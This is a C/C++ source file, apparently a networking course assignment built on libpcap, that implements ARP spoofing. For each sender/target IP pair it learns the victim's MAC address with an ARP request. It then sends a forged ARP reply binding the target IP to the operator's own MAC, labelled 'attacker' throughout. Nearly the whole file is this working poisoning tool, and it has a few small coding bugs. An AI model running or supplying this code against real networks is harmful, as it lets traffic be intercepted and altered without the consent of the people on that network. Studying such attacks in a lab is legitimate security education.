#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pcap.h>
#include <unistd.h>
#include <cstdio>
#include "mac.h"
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"
// Eth header Type filed
#define ETHERTYPE_ARP 0x0806

// Structure in ip.h, mac,h header
Ip sender_ip;
Ip target_ip;
Mac attacker_mac;
Mac broad = Mac::broadcastMac();
Mac unknown = Mac::nullMac();

// Function define
void usage();
void send_arp(char *interface,Mac sender_mac,Mac attacker_mac,Ip sender_ip, Ip target_ip,int flag);
void get_attacker_mac(char *interface,Mac *attacker_mac);
void get_sender_mac(char *interface,Mac sender_mac,Mac attacker_mac,Ip sender_ip, Ip target_ip);

// Structure in ethhdr.h
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

int main(int argc, char** argv) {
	int i;
	Mac sender_mac;
	
	// If argc%2 == 1 mean, indicating that sender and target are not paired together.
	if (argc < 4 || argc%2 == 1) {
		usage();
	} else {
		char *interface = argv[1];
		get_attacker_mac(interface,&attacker_mac);
		for(i=2;i<argc;i+=2) {
			sender_ip = Ip(std::string(argv[i]));
			target_ip = Ip(std::string(argv[i+1]));
			get_sender_mac(interface,sender_mac,attacker_mac,sender_ip,target_ip);
		}
	}
}

// send-arp-test/main.cpp reference
void usage() {
	printf("\nsyntax: send-arp-test <interface> <sender_ip> <target_ip> ...\n");
	printf("sample: send-arp-test wlan0 192.168.0.2 192.168.0.3 ...\n\n");
}

void send_arp(char *interface,Mac sender_mac,Mac attacker_mac,Ip sender_ip, Ip target_ip,int flag) {
	char errbuf[PCAP_ERRBUF_SIZE];
	char buf[BUFSIZ]; // BUFSIZ define in stdio.h
	
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);

	EthArpPacket packet;
	
	// flag 1 : Request(Don`t know sender MAC) , flag 2 : Reply(Know sender MAC)
	if ( flag == 1 ) {
		packet.arp_.op_ = htons(ArpHdr::Request);
		sender_mac = unknown; // unknown = 00:00:00:00:00
	} else if ( flag == 2 ) {
		packet.arp_.op_ = htons(ArpHdr::Reply);
	} else {
		printf("Arp Header Option Error");
	}
		
	packet.eth_.smac_ = attacker_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.eth_.dmac_ = sender_mac;
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.smac_ = attacker_mac;
	packet.arp_.sip_ = htonl(target_ip);
	packet.arp_.tmac_ = sender_mac;
	packet.arp_.tip_ = htonl(sender_ip);
	
	// send-arp-test/main.cpp reference
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {	
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
}

void get_sender_mac(char *interface,Mac sender_mac,Mac attacker_mac,Ip sender_ip, Ip target_ip) {
	// ARP send with flag 1
	send_arp(interface,broad,attacker_mac,sender_ip,target_ip,1);
	
	// pcap-test.c reference
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
	fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface, errbuf);
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		
		// pcap-test.c reference
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}

		EthArpPacket *reply_packet;
		reply_packet = (EthArpPacket *)packet;

		// If eth header type field is not ETHERTYPE_ARP
		if (reply_packet->eth_.type() != ETHERTYPE_ARP) {
			continue;
		}
		
		if(reply_packet->arp_.sip() == sender_ip) {
			if(sender_mac == reply_packet->eth_.smac()) {
				printf("Already know the sender MAC address.\n");
				send_arp(interface,sender_mac,attacker_mac,sender_ip,target_ip,2);
				break;
			} else {
				sender_mac = reply_packet->eth_.smac();
				printf("Sender Mac address is %s\n",std::string(sender_mac).data());
				send_arp(interface,sender_mac,attacker_mac,sender_ip,target_ip,2);
				break;
			}
		} else {
			printf("Another ARP packet. This Packet Sender is Not %s\n",std::string(sender_ip).data());
			continue;
		}
	}
}

// https://blog.naver.com/okopok5019/221877720386 reference
void get_attacker_mac(char *interface,Mac *attacker_mac) {
	int sock;
	struct ifreq ifr;
	int fd;
	
	memset(&ifr, 0x00, sizeof(ifr));
	strcpy(ifr.ifr_name, interface);

	fd = socket(AF_INET, SOCK_STREAM, 0);

	if (sock = socket(AF_INET, SOCK_STREAM, 0) < 0) {
		printf("socket error");
	}

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		printf("ioctl");
	}
	*attacker_mac = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
	close(fd);
}
